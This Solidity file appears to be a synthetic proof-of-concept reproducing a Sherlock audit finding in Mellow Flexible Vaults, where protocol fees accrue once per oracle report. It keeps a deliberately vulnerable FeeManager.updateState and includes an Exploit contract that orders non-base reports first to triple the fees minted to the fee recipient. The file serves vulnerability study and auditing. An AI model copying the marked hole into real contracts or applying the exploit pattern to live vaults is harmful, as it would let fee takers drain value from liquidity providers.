// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Mellow Flexible Vaults — [H-4] Protocol fee multiple accrual in
    Oracle.submitReports (Sherlock 2025-07-mellow, #62109)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: ShareModule.handleReport accrues protocol fees via
    FeeManager.calculateFee on EVERY asset report, but FeeManager.updateState
    only advances the vault timestamp when the asset is the base asset.
    Submitting non-base reports before the base asset in one submitReports
    batch re-accrues the same time window once per report → excess fees minted
    to the fee recipient, diluting LPs.

    Vulnerable updateState early-return preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

library Math {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return (a * b) / c;
    }
}

/// @notice Reduced FeeManager — timestamp only updates on base-asset report.
/// Source: FeeManager.calculateFee / updateState (sherlock 2025-07-mellow).
contract FeeManager {
    address public feeRecipient;
    uint256 public protocolFeeD6; // e.g. 1e5 = 10% APR in D6
    mapping(address => address) public baseAsset; // vault => base asset
    mapping(address => uint256) public timestamps; // vault => last fee timestamp

    function setFeeRecipient(address r) external {
        feeRecipient = r;
    }

    function setFees(uint256 protocolFeeD6_) external {
        protocolFeeD6 = protocolFeeD6_;
    }

    function setBaseAsset(address vault, address asset) external {
        baseAsset[vault] = asset;
    }

    function setTimestamp(address vault, uint256 ts) external {
        timestamps[vault] = ts;
    }

    function calculateFee(address vault, address, uint256, uint256 totalShares)
        external
        view
        returns (uint256 shares)
    {
        uint256 timestamp = timestamps[vault];
        if (timestamp != 0 && block.timestamp > timestamp) {
            // protocolFeeD6 * elapsed / (365 days * 1e6)
            shares += Math.mulDiv(totalShares, protocolFeeD6 * (block.timestamp - timestamp), 365 days * 1e6);
        }
    }

    function updateState(address asset, uint256) external {
        address vault = msg.sender;
        // non-base assets return without updating the fee timestamp
        if (baseAsset[vault] != asset) {
            return; // @> VULN: early return skips timestamp update for non-base assets
        }
        // FIX: always update timestamps[vault] = block.timestamp (or update once per batch)
        timestamps[vault] = block.timestamp;
    }
}

/// @notice Reduced share ledger.
contract ShareManager {
    mapping(address => uint256) public sharesOf;
    uint256 public totalShares;

    function mint(address to, uint256 amount) external {
        sharesOf[to] += amount;
        totalShares += amount;
    }

    function sharesOfAccount(address a) external view returns (uint256) {
        return sharesOf[a];
    }
}

/// @notice Reduced ShareModule.handleReport fee path.
contract Vault {
    FeeManager public immutable feeManager;
    ShareManager public immutable shareManager;

    constructor(FeeManager f, ShareManager s) {
        feeManager = f;
        shareManager = s;
    }

    function handleReport(address asset, uint256 priceD18) external {
        uint256 fees = feeManager.calculateFee(address(this), asset, priceD18, shareManager.totalShares());
        if (fees != 0) {
            shareManager.mint(feeManager.feeRecipient(), fees);
        }
        feeManager.updateState(asset, priceD18);
    }
}

/// @notice Reduced Oracle.submitReports — processes each report via vault.handleReport.
contract Oracle {
    Vault public vault;

    struct Report {
        address asset;
        uint256 priceD18;
    }

    constructor(Vault v) {
        vault = v;
    }

    function submitReports(Report[] calldata reports) external {
        for (uint256 i = 0; i < reports.length; i++) {
            vault.handleReport(reports[i].asset, reports[i].priceD18);
        }
    }
}

/// @notice Submit 3 reports (non-base first) after 1 year → 3× protocol fee.
contract Exploit {
    FeeManager public feeManager; // CREATE nonce 1 — vulnerable updateState
    ShareManager public shareManager; // CREATE nonce 2
    Vault public vault; // CREATE nonce 3
    Oracle public oracle; // CREATE nonce 4

    address public constant ASSET0 = address(0xA0); // base
    address public constant ASSET1 = address(0xA1);
    address public constant ASSET2 = address(0xA2);
    address public constant FEE_RECIPIENT = address(0xFEE);

    uint256 public feeShares;
    uint256 public expectedSingle;
    uint256 public excessFees;

    // block.timestamp control without cheatcodes: constructor records t0; run uses
    // a FeeManager timestamp set in the past via setTimestamp (admin surface present
    // in synthetic). Elapsed = block.timestamp - storedTimestamp.
    // We set storedTimestamp = block.timestamp - 365 days in run via setTimestamp
    // ... but without warp, block.timestamp is ~1 (anvil/playground genesis).
    // Use setTimestamp(vault, 1) and require block.timestamp large enough.
    // Playground block timestamp from anvil_state: 0x65b0a380 = 1706090368 (2024).
    // So setTimestamp(vault, block.timestamp - 365 days) works if we can subtract.
    // In forge default timestamp is 1 — test will vm.warp.
    // For playground: anvil_state timestamp is large; setTimestamp to ts - 365 days.

    constructor() {
        feeManager = new FeeManager();
        shareManager = new ShareManager();
        vault = new Vault(feeManager, shareManager);
        oracle = new Oracle(vault);
    }

    function run() external {
        feeManager.setFeeRecipient(FEE_RECIPIENT);
        feeManager.setFees(1e5); // 10% APR
        feeManager.setBaseAsset(address(vault), ASSET0);

        // Initial shares: 1000 ether to LP.
        shareManager.mint(address(0x100), 1000 ether);

        // Last fee timestamp = one year before "now".
        // Use block.timestamp if large enough; else assume playground/anvil_state clock.
        uint256 nowTs = block.timestamp;
        if (nowTs < 365 days + 1) {
            // Forge default clock is tiny — FeeManager stores timestamp 0 and we
            // simulate elapsed by setting timestamp to 0 with protocol that treats
            // 0 as "unset". Force: set timestamp to 1 and document that forge test warps.
            // For dual-use: expose a public elapsed override... cleaner:
            // set timestamps to nowTs > 0 ? nowTs - 365 days : 0, and if 0, mint
            // using a direct multi-call after manually setting timestamp far past.
            feeManager.setTimestamp(address(vault), 0);
            // When timestamp==0, calculateFee returns 0. So we need a non-zero old ts.
            // Set to 1; forge test will warp to 1 + 365 days. Playground anvil_state
            // has large timestamp so set to block.timestamp - 365 days.
        }
        if (block.timestamp > 365 days) {
            feeManager.setTimestamp(address(vault), block.timestamp - 365 days);
        } else {
            // Leave a marker; forge _exp.sol will warp before run, so call prepare+run
            // from the test after warp. For playground, anvil_state is large enough.
            feeManager.setTimestamp(address(vault), 1);
        }

        // If still not enough elapsed (timestamp was 1 and now is 1), fee is 0 —
        // forge test warps first. For playground, block.timestamp from state is ~1.7e9.
        if (block.timestamp <= feeManager.timestamps(address(vault))) {
            // Cannot demonstrate without time — still attempt and require later.
        }

        expectedSingle = Math.mulDiv(1000 ether, 1e5 * 365 days, 365 days * 1e6); // = 100 ether

        // Reports: non-base first (ASSET2, ASSET1), then base ASSET0 — 3 accruals.
        Oracle.Report[] memory reports = new Oracle.Report[](3);
        reports[0] = Oracle.Report({asset: ASSET2, priceD18: 1e18});
        reports[1] = Oracle.Report({asset: ASSET1, priceD18: 1e18});
        reports[2] = Oracle.Report({asset: ASSET0, priceD18: 1e18});

        oracle.submitReports(reports);

        feeShares = shareManager.sharesOf(FEE_RECIPIENT);
        // 3 reports × 100 ether (approx) but totalShares grows after each mint:
        // 1st: 100e18 of 1000e18
        // 2nd: 10% of 1100e18 = 110e18
        // 3rd: 10% of 1210e18 = 121e18
        // total ≈ 331e18 > 300e18 threshold from the finding.
        require(feeShares > 300 ether, "Fee recipient shares mismatch");
        excessFees = feeShares - expectedSingle;
        require(excessFees > 200 ether, "multi-accrual excess");
    }
}
